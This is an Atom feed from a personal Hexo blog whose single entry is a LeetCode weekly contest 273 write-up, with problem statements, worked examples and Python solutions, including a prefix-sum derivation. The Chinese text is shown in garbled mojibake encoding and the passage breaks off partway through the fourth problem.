<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ELSSM</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="elssm.github.io/"/>
  <updated>2021-12-26T09:00:20.422Z</updated>
  <id>elssm.github.io/</id>
  
  <author>
    <name>elssm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Leetcodeç¬¬273åœºå‘¨èµ›write up</title>
    <link href="elssm.github.io/2021/12/26/Leetcode%E7%AC%AC273%E5%9C%BA%E5%91%A8%E8%B5%9Bwrite-up/"/>
    <id>elssm.github.io/2021/12/26/Leetcodeç¬¬273åœºå‘¨èµ›write-up/</id>
    <published>2021-12-26T08:12:20.000Z</published>
    <updated>2021-12-26T09:00:20.422Z</updated>
    
    <content type="html"><![CDATA[<h4 id="åè½¬ä¸¤æ¬¡çš„æ•°å­—"><a href="#åè½¬ä¸¤æ¬¡çš„æ•°å­—" class="headerlink" title="åè½¬ä¸¤æ¬¡çš„æ•°å­—"></a>åè½¬ä¸¤æ¬¡çš„æ•°å­—</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åè½¬ ä¸€ä¸ªæ•´æ•°æ„å‘³ç€å€’ç½®å®ƒçš„æ‰€æœ‰ä½ã€‚</span><br><span class="line">ä¾‹å¦‚ï¼Œåè½¬ 2021 å¾—åˆ° 1202 ã€‚åè½¬ 12300 å¾—åˆ° 321 ï¼Œä¸ä¿ç•™å‰å¯¼é›¶ ã€‚</span><br><span class="line">ç»™ä½ ä¸€ä¸ªæ•´æ•° num ï¼Œåè½¬ num å¾—åˆ° reversed1 ï¼Œæ¥ç€åè½¬ reversed1 å¾—åˆ° reversed2 ã€‚å¦‚æœ reversed2 ç­‰äº num ï¼Œè¿”å› true ï¼›å¦åˆ™ï¼Œè¿”å› false ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šnum = 526</span><br><span class="line">è¾“å‡ºï¼štrue</span><br><span class="line">è§£é‡Šï¼šåè½¬ num å¾—åˆ° 625 ï¼Œæ¥ç€åè½¬ 625 å¾—åˆ° 526 ï¼Œç­‰äº num ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šnum = 1800</span><br><span class="line">è¾“å‡ºï¼šfalse</span><br><span class="line">è§£é‡Šï¼šåè½¬ num å¾—åˆ° 81 ï¼Œæ¥ç€åè½¬ 81 å¾—åˆ° 18 ï¼Œä¸ç­‰äº num ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šnum = 0</span><br><span class="line">è¾“å‡ºï¼štrue</span><br><span class="line">è§£é‡Šï¼šåè½¬ num å¾—åˆ° 0 ï¼Œæ¥ç€åè½¬ 0 å¾—åˆ° 0 ï¼Œç­‰äº num ã€‚</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜åˆ†ä¸¤ç§æƒ…å†µï¼Œæœ€åä¸€ä½æ˜¯0å’Œæœ€åä¸€ä½ä¸æ˜¯0ã€‚</p><p>å¦‚æœæœ€åä¸€ä½æ˜¯ä¸æ˜¯0ï¼Œç›´æ¥è¿”å›True</p><p>å¦‚æœæœ€åä¸€ä½æ˜¯0ï¼Œåˆ†è¿™ä¸ªæ•°æ˜¯0è¿˜æ˜¯å…¶ä»–æ•°å­—ã€‚å¦‚æœè¿™ä¸ªæ•°æ˜¯0ï¼Œç›´æ¥å›è¿”Trueï¼Œå¦‚æœè¿™ä¸ªæ•°ä¸æ˜¯0ï¼Œç›´æ¥è¿”å›False</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isSameAfterReversals</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type num: int</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> num%<span class="number">10</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="æ‰§è¡Œæ‰€æœ‰åç¼€æŒ‡ä»¤"><a href="#æ‰§è¡Œæ‰€æœ‰åç¼€æŒ‡ä»¤" class="headerlink" title="æ‰§è¡Œæ‰€æœ‰åç¼€æŒ‡ä»¤"></a>æ‰§è¡Œæ‰€æœ‰åç¼€æŒ‡ä»¤</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ç°æœ‰ä¸€ä¸ª n x n å¤§å°çš„ç½‘æ ¼ï¼Œå·¦ä¸Šè§’å•å…ƒæ ¼åæ ‡ (0, 0) ï¼Œå³ä¸‹è§’å•å…ƒæ ¼åæ ‡ (n - 1, n - 1) ã€‚ç»™ä½ æ•´æ•° n å’Œä¸€ä¸ªæ•´æ•°æ•°ç»„ startPos ï¼Œå…¶ä¸­ startPos = [startrow, startcol] è¡¨ç¤ºæœºå™¨äººæœ€å¼€å§‹åœ¨åæ ‡ä¸º (startrow, startcol) çš„å•å…ƒæ ¼ä¸Šã€‚</span><br><span class="line">å¦ç»™ä½ ä¸€ä¸ªé•¿åº¦ä¸º m ã€ä¸‹æ ‡ä» 0 å¼€å§‹çš„å­—ç¬¦ä¸² s ï¼Œå…¶ä¸­ s[i] æ˜¯å¯¹æœºå™¨äººçš„ç¬¬ i æ¡æŒ‡ä»¤ï¼š&apos;L&apos;ï¼ˆå‘å·¦ç§»åŠ¨ï¼‰ï¼Œ&apos;R&apos;ï¼ˆå‘å³ç§»åŠ¨ï¼‰ï¼Œ&apos;U&apos;ï¼ˆå‘ä¸Šç§»åŠ¨ï¼‰å’Œ &apos;D&apos;ï¼ˆå‘ä¸‹ç§»åŠ¨ï¼‰ã€‚</span><br><span class="line">æœºå™¨äººå¯ä»¥ä» s ä¸­çš„ä»»ä¸€ç¬¬ i æ¡æŒ‡ä»¤å¼€å§‹æ‰§è¡Œã€‚å®ƒå°†ä¼šé€æ¡æ‰§è¡ŒæŒ‡ä»¤ç›´åˆ° s çš„æœ«å°¾ï¼Œä½†åœ¨æ»¡è¶³ä¸‹è¿°æ¡ä»¶ä¹‹ä¸€æ—¶ï¼Œæœºå™¨äººå°†ä¼šåœæ­¢ï¼š</span><br><span class="line">ä¸‹ä¸€æ¡æŒ‡ä»¤å°†ä¼šå¯¼è‡´æœºå™¨äººç§»åŠ¨åˆ°ç½‘æ ¼å¤–ã€‚</span><br><span class="line">æ²¡æœ‰æŒ‡ä»¤å¯ä»¥æ‰§è¡Œã€‚</span><br><span class="line">è¿”å›ä¸€ä¸ªé•¿åº¦ä¸º m çš„æ•°ç»„ answer ï¼Œå…¶ä¸­ answer[i] æ˜¯æœºå™¨äººä»ç¬¬ i æ¡æŒ‡ä»¤ å¼€å§‹ ï¼Œå¯ä»¥æ‰§è¡Œçš„æŒ‡ä»¤æ•°ç›®ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šn = 3, startPos = [0,1], s = &quot;RRDDLU&quot;</span><br><span class="line">è¾“å‡ºï¼š[1,5,4,3,1,0]</span><br><span class="line">è§£é‡Šï¼šæœºå™¨äººä» startPos å‡ºå‘ï¼Œå¹¶ä»ç¬¬ i æ¡æŒ‡ä»¤å¼€å§‹æ‰§è¡Œï¼š</span><br><span class="line">- 0: &quot;RRDDLU&quot; åœ¨ç§»åŠ¨åˆ°ç½‘æ ¼å¤–ä¹‹å‰ï¼Œåªèƒ½æ‰§è¡Œä¸€æ¡ &quot;R&quot; æŒ‡ä»¤ã€‚</span><br><span class="line">- 1:  &quot;RDDLU&quot; å¯ä»¥æ‰§è¡Œå…¨éƒ¨äº”æ¡æŒ‡ä»¤ï¼Œæœºå™¨äººä»åœ¨ç½‘æ ¼å†…ï¼Œæœ€ç»ˆåˆ°è¾¾ (0, 0) ã€‚</span><br><span class="line">- 2:   &quot;DDLU&quot; å¯ä»¥æ‰§è¡Œå…¨éƒ¨å››æ¡æŒ‡ä»¤ï¼Œæœºå™¨äººä»åœ¨ç½‘æ ¼å†…ï¼Œæœ€ç»ˆåˆ°è¾¾ (0, 0) ã€‚</span><br><span class="line">- 3:    &quot;DLU&quot; å¯ä»¥æ‰§è¡Œå…¨éƒ¨ä¸‰æ¡æŒ‡ä»¤ï¼Œæœºå™¨äººä»åœ¨ç½‘æ ¼å†…ï¼Œæœ€ç»ˆåˆ°è¾¾ (0, 0) ã€‚</span><br><span class="line">- 4:     &quot;LU&quot; åœ¨ç§»åŠ¨åˆ°ç½‘æ ¼å¤–ä¹‹å‰ï¼Œåªèƒ½æ‰§è¡Œä¸€æ¡ &quot;L&quot; æŒ‡ä»¤ã€‚</span><br><span class="line">- 5:      &quot;U&quot; å¦‚æœå‘ä¸Šç§»åŠ¨ï¼Œå°†ä¼šç§»åŠ¨åˆ°ç½‘æ ¼å¤–ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šn = 2, startPos = [1,1], s = &quot;LURD&quot;</span><br><span class="line">è¾“å‡ºï¼š[4,1,0,0]</span><br><span class="line">è§£é‡Šï¼š</span><br><span class="line">- 0: &quot;LURD&quot;</span><br><span class="line">- 1:  &quot;URD&quot;</span><br><span class="line">- 2:   &quot;RD&quot;</span><br><span class="line">- 3:    &quot;D&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šn = 1, startPos = [0,0], s = &quot;LRUD&quot;</span><br><span class="line">è¾“å‡ºï¼š[0,0,0,0]</span><br><span class="line">è§£é‡Šï¼šæ— è®ºæœºå™¨äººä»å“ªæ¡æŒ‡ä»¤å¼€å§‹æ‰§è¡Œï¼Œéƒ½ä¼šç§»åŠ¨åˆ°ç½‘æ ¼å¤–ã€‚</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ï¼Œæ‹¿åˆ°æ‰‹ï¼Œæˆ‘å°±ç›´æ¥ä¸Š<code>if else</code>ã€‚åˆ†åˆ«å¯¹ä¸Šä¸‹å·¦å³è¿›è¡Œè¾¹ç•Œåˆ¤æ–­ï¼Œå¦‚æœå­—ç¬¦ä¸²æœ€ç»ˆèµ°å®Œäº†ï¼Œé‚£ä¹ˆè¯´æ˜è¯¥å­—ç¬¦ä¸²çš„æŒ‡ä»¤éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¦‚æœæ‰§è¡Œåˆ°ä¸€åŠé€€å‡ºäº†ï¼Œé‚£ä¹ˆè¯´æ˜è¶Šç•Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">executeInstructions</span><span class="params">(self, n, startPos, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :type startPos: List[int]</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">          <span class="comment">#flagç”¨æ¥æ ‡è®°æ˜¯å¦åœ¨å­—ç¬¦ä¸²ä¸­é—´é€€å‡º</span></span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            tmpPos = startPos[:]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i, len(s)):</span><br><span class="line">                <span class="keyword">if</span> s[j] == <span class="string">'L'</span>:</span><br><span class="line">                    tmpPos[<span class="number">1</span>] -= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> tmpPos[<span class="number">1</span>] &lt; <span class="number">0</span>:</span><br><span class="line">                        res.append(j-i)</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> s[j] == <span class="string">'R'</span>:</span><br><span class="line">                    tmpPos[<span class="number">1</span>] += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> tmpPos[<span class="number">1</span>] &gt;= n:</span><br><span class="line">                        res.append(j-i)</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> s[j] == <span class="string">'U'</span>:</span><br><span class="line">                    tmpPos[<span class="number">0</span>] -= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> tmpPos[<span class="number">0</span>] &lt; <span class="number">0</span>:</span><br><span class="line">                        res.append(j-i)</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> s[j] == <span class="string">'D'</span>:</span><br><span class="line">                    tmpPos[<span class="number">0</span>] += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> tmpPos[<span class="number">0</span>] &gt;= n:</span><br><span class="line">                        res.append(j-i)</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                res.append(len(s) - i)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>åšç¬¬ä¸‰é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥åšä¸€ä¸‹<code>Leetcode</code>1685é¢˜ï¼Œç¬¬ä¸‰é¢˜å’Œè¿™é“é¢˜ç±»ä¼¼ã€‚</p><h4 id="æœ‰åºæ•°ç»„ä¸­å·®ç»å¯¹å€¼ä¹‹å’Œ"><a href="#æœ‰åºæ•°ç»„ä¸­å·®ç»å¯¹å€¼ä¹‹å’Œ" class="headerlink" title="æœ‰åºæ•°ç»„ä¸­å·®ç»å¯¹å€¼ä¹‹å’Œ"></a>æœ‰åºæ•°ç»„ä¸­å·®ç»å¯¹å€¼ä¹‹å’Œ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç»™ä½ ä¸€ä¸ª éé€’å‡Â æœ‰åºæ•´æ•°æ•°ç»„Â numsÂ ã€‚</span><br><span class="line">è¯·ä½ å»ºç«‹å¹¶è¿”å›ä¸€ä¸ªæ•´æ•°æ•°ç»„Â resultï¼Œå®ƒè·ŸÂ numsÂ é•¿åº¦ç›¸åŒï¼Œä¸”result[i]Â ç­‰äºÂ nums[i]Â ä¸æ•°ç»„ä¸­æ‰€æœ‰å…¶ä»–å…ƒç´ å·®çš„ç»å¯¹å€¼ä¹‹å’Œã€‚</span><br><span class="line">æ¢å¥è¯è¯´ï¼ŒÂ result[i]Â ç­‰äºÂ sum(|nums[i]-nums[j]|) ï¼Œå…¶ä¸­Â 0 &lt;= j &lt; nums.length ä¸”Â j != iÂ ï¼ˆä¸‹æ ‡ä» 0 å¼€å§‹ï¼‰ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šnums = [2,3,5]</span><br><span class="line">è¾“å‡ºï¼š[4,3,5]</span><br><span class="line">è§£é‡Šï¼šå‡è®¾æ•°ç»„ä¸‹æ ‡ä» 0 å¼€å§‹ï¼Œé‚£ä¹ˆ</span><br><span class="line">result[0] = |2-2| + |2-3| + |2-5| = 0 + 1 + 3 = 4ï¼Œ</span><br><span class="line">result[1] = |3-2| + |3-3| + |3-5| = 1 + 0 + 2 = 3ï¼Œ</span><br><span class="line">result[2] = |5-2| + |5-3| + |5-5| = 3 + 2 + 0 = 5ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šnums = [1,4,6,8,10]</span><br><span class="line">è¾“å‡ºï¼š[24,15,13,15,21]</span><br></pre></td></tr></table></figure><p>åˆçœ‹è¿™é“é¢˜ï¼Œæˆ‘çœ¼å‰ä¸€äº®ï¼Œä¸€ä¸Šæ¥å°±æ˜¯ä¸€ä¸ªåŒé‡å¾ªç¯ã€‚å¤šä¹ˆç¾å¦™çš„æ‰‹æ³•å•Šï¼å†™å®Œä¹‹åï¼Œæ‰§è¡Œä»£ç æ²¡æœ‰é—®é¢˜ï¼Œç‚¹å‡»æäº¤ï¼Œå¤šä¹ˆä¼˜é›…ï¼è¿‡äº†ä¸‰ç§’ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘çŸ¥é“æˆ‘å¤§æ„äº†ã€‚</p><p><img src="/2021/12/26/Leetcodeç¬¬273åœºå‘¨èµ›write-up/1.png" alt="1"></p><p>æ€ç´¢æ•°åˆ†é’Ÿåï¼Œæˆ‘ç‚¹å‡»äº†<code>ç›¸å…³æ ‡ç­¾</code>è¿™ä¸ªé€‰é¡¹ï¼Œè¯•å›¾å¯»æ‰¾ä¸€ä¸çµæ„Ÿã€‚ç›¸å…³æ ‡ç­¾é‡Œå†™åˆ°äº†ä¸‰ä¸ªå¤§å­—ï¼Œå‰ç¼€å’Œã€‚æˆ‘æç„¶å¤§æ‚Ÿã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘å°†é€šè¿‡å¦‚ä¸‹çš„æ€è·¯æ¥è¿›è¡Œåˆ†æã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">è§£é¢˜æ€è·¯ï¼š</span><br><span class="line">        å› ä¸ºæ˜¯æœ‰åºæ’åˆ—ï¼Œå› æ­¤åä¸€ä¸ªå‡å»å‰ä¸€ä¸ªè‚¯å®šæ˜¯æ­£æ•°ï¼Œæ— è®ºæ˜¯å¦åŠ ç»å¯¹å€¼</span><br><span class="line">        è€ƒè™‘nums = 2 3 5 6è¿™å››ä¸ªæ•°</span><br><span class="line">        res1 = |2-2|+|2-3|+|2-5|+|2-6|</span><br><span class="line">        ä»ç¬¬äºŒä¸ªç»å¯¹å€¼å¼€å§‹ï¼Œç»“æœéƒ½è¦å–åï¼Œä¸è€ƒè™‘ç›¸ç­‰çš„å€¼</span><br><span class="line">        å°†res1æ”¹ä¸º</span><br><span class="line">        res1 = 2-2+3-2+5-2+6-2 = sum(nums)-2*len(nums)</span><br><span class="line">        </span><br><span class="line">        res2 = |3-2|+|3-3|+|3-5|+|3-6|</span><br><span class="line">        ä»ç¬¬ä¸‰ä¸ªç»å¯¹å€¼å¼€å§‹ï¼Œç»“æœéƒ½è¦å–åï¼Œä¸è€ƒè™‘ç›¸ç­‰çš„å€¼</span><br><span class="line">        å°†res2æ”¹ä¸º</span><br><span class="line">        res2 = 3-2+3-3+5-3+6-3ï¼Œå…¶ä¸­ä¸ºäº†å‡‘åˆ°sum(res1)</span><br><span class="line">        æˆ‘ä»¬å°† 3-2 å‡‘æˆ (2-3)+(3-2)*2</span><br><span class="line">        åˆ™res2 = sum(nums)-3*len(nums) + (3-2)*2</span><br><span class="line">        </span><br><span class="line">        res3 = |5-2|+|5-3|+|5-5|+|5-6|</span><br><span class="line">        ä»ç¬¬å››ä¸ªç»å¯¹å€¼å¼€å§‹ï¼Œç»“æœéƒ½è¦å–åï¼Œä¸è€ƒè™‘ç›¸ç­‰çš„å€¼</span><br><span class="line">        å°†res3æ”¹ä¸º</span><br><span class="line">        res3 = 5-2+5-3+5-5+6-5ï¼Œå…¶ä¸­ä¸ºäº†å‡‘åˆ°sum(res1)</span><br><span class="line">        æˆ‘ä»¬å°† 5-2+5-3 å‡‘æˆ (2-5+3-5)+(5-2+5-3)*2</span><br><span class="line">        åˆ™res2 = sum(nums)-5*len(nums) + (5-2+5-3)*2</span><br><span class="line">        </span><br><span class="line">        res4 = |6-2|+|6-3|+|6-5|+|6-6|</span><br><span class="line">        å°†res4æ”¹ä¸º</span><br><span class="line">        res4 = 6-2+6-3+6-5+6-6ï¼Œå…¶ä¸­ä¸ºäº†å‡‘åˆ°sum(res1)</span><br><span class="line">        æˆ‘ä»¬å°† 6-2+6-3+6-5 å‡‘æˆ (2-6+3-6+5-6)+(6-2+6-3+6-5)*2</span><br><span class="line">        åˆ™res2 = sum(nums)-6*len(nums) + (6-2+6-3+6-5)*2</span><br><span class="line">        </span><br><span class="line">        é€šè¿‡ä¸Šè¿°åˆ†ææˆ‘ä»¬æœ€ç»ˆå¯ä»¥å¾—åˆ°ç¬¬iä¸ªæ•°çš„ç»“æœä¸º</span><br><span class="line">        res[i] = (sum(nums)-nums[i]*len(nums)+(nums[i]*i - sum(1...i))*2</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ çœ‹æ‡‚äº†ä¸Šé¢çš„åˆ†æè¿‡ç¨‹ï¼Œé‚£ä¹ˆä»£ç å†™èµ·æ¥å°†ä¼šéå¸¸å®¹æ˜“ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getSumAbsoluteDifferences</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        n = len(nums)</span><br><span class="line">        sums = sum(nums)</span><br><span class="line">        tmp_sum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            res.append(sums - nums[i] * n + (nums[i] * i - tmp_sum) * <span class="number">2</span>)</span><br><span class="line">            tmp_sum += nums[i]</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>ç°åœ¨è®©æˆ‘ä»¬å›åˆ°æœ¬å‘¨å‘¨èµ›çš„ç¬¬ä¸‰é¢˜</p><h4 id="ç›¸åŒå…ƒç´ çš„é—´éš”ä¹‹å’Œ"><a href="#ç›¸åŒå…ƒç´ çš„é—´éš”ä¹‹å’Œ" class="headerlink" title="ç›¸åŒå…ƒç´ çš„é—´éš”ä¹‹å’Œ"></a>ç›¸åŒå…ƒç´ çš„é—´éš”ä¹‹å’Œ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç»™ä½ ä¸€ä¸ªä¸‹æ ‡ä» 0 å¼€å§‹ã€ç”± n ä¸ªæ•´æ•°ç»„æˆçš„æ•°ç»„ arr ã€‚</span><br><span class="line">arr ä¸­ä¸¤ä¸ªå…ƒç´ çš„é—´éš”å®šä¹‰ä¸ºå®ƒä»¬ä¸‹æ ‡ä¹‹é—´çš„ ç»å¯¹å·® ã€‚æ›´æ­£å¼åœ°ï¼Œarr[i]å’Œarr[j] ä¹‹é—´çš„é—´éš”æ˜¯ |i - j|ã€‚</span><br><span class="line">è¿”å›ä¸€ä¸ªé•¿åº¦ä¸º n çš„æ•°ç»„Â intervals ï¼Œå…¶ä¸­ intervals[i] æ˜¯ arr[i] å’Œ arr ä¸­æ¯ä¸ªç›¸åŒå…ƒç´ ï¼ˆä¸ arr[i] çš„å€¼ç›¸åŒï¼‰çš„ é—´éš”ä¹‹å’Œ ã€‚</span><br><span class="line">æ³¨æ„ï¼š|x| æ˜¯ x çš„ç»å¯¹å€¼ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šarr = [2,1,3,1,2,3,3]</span><br><span class="line">è¾“å‡ºï¼š[4,2,7,2,4,4,5]</span><br><span class="line">è§£é‡Šï¼š</span><br><span class="line">- ä¸‹æ ‡ 0 ï¼šå¦ä¸€ä¸ª 2 åœ¨ä¸‹æ ‡ 4 ï¼Œ|0 - 4| = 4</span><br><span class="line">- ä¸‹æ ‡ 1 ï¼šå¦ä¸€ä¸ª 1 åœ¨ä¸‹æ ‡ 3 ï¼Œ|1 - 3| = 2</span><br><span class="line">- ä¸‹æ ‡ 2 ï¼šå¦ä¸¤ä¸ª 3 åœ¨ä¸‹æ ‡ 5 å’Œ 6 ï¼Œ|2 - 5| + |2 - 6| = 7</span><br><span class="line">- ä¸‹æ ‡ 3 ï¼šå¦ä¸€ä¸ª 1 åœ¨ä¸‹æ ‡ 1 ï¼Œ|3 - 1| = 2</span><br><span class="line">- ä¸‹æ ‡ 4 ï¼šå¦ä¸€ä¸ª 2 åœ¨ä¸‹æ ‡ 0 ï¼Œ|4 - 0| = 4</span><br><span class="line">- ä¸‹æ ‡ 5 ï¼šå¦ä¸¤ä¸ª 3 åœ¨ä¸‹æ ‡ 2 å’Œ 6 ï¼Œ|5 - 2| + |5 - 6| = 4</span><br><span class="line">- ä¸‹æ ‡ 6 ï¼šå¦ä¸¤ä¸ª 3 åœ¨ä¸‹æ ‡ 2 å’Œ 5 ï¼Œ|6 - 2| + |6 - 5| = 5</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span 